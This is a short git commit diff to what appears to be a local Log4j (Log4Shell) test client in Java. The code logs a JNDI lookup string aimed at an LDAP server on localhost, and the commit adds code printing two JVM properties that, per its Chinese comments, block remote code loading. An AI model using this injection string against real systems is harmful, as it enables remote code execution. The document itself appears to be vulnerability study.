7bc7213895cd771e06e2365ef6aced5ab35bef9b
emperWang <544094478@qq.com>
2021-12-12 23:02:50 +0800

    log4j client

--- java_javaLog4j_client/src/main/java/Main.java
+++ java_javaLog4j_client/src/main/java/Main.java
@@ -16,5 +16,12 @@ public class Main {
     public static void main(String[] args) throws IOException {
         log.error("${jndi:ldap://127.0.0.1:1389/badClassName}");
         //Runtime.getRuntime().exec("calc");
+        // 当java.rmi.server.useCodebaseOnly = true时,不允许执行远程代码
+        String property = System.getProperty("java.rmi.server.useCodebaseOnly");
+        System.out.println(property);
+
+        // com.sun.jndi.ldap.object.trustURLCodebase=false 不执行远程代码
+        String property1 = System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase");
+        System.out.println(property1);
     }
 }
